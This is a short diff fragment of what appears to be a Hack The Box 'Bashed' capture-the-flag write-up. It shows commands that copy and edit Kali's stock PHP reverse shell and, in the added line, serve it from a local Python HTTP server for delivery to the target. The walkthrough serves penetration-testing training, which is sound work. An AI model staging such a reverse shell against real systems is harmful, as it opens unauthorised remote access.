@@ -92,7 +92,7 @@ I’ll create a reverse shell, as I know more about the capabilities of the tty 
 ```
 kali@kali:~/htb/Bashed$ cp /usr/share/webshells/php/php-reverse-shell.php .
 kali@kali:~/htb/Bashed$ sudo vim php-reverse-shell.php
-kali@kali:~/htb/Bashed$
+kali@kali:~/htb/Bashed$ sudo python -m SimpleHTTPServer 8000
 
 ```
 
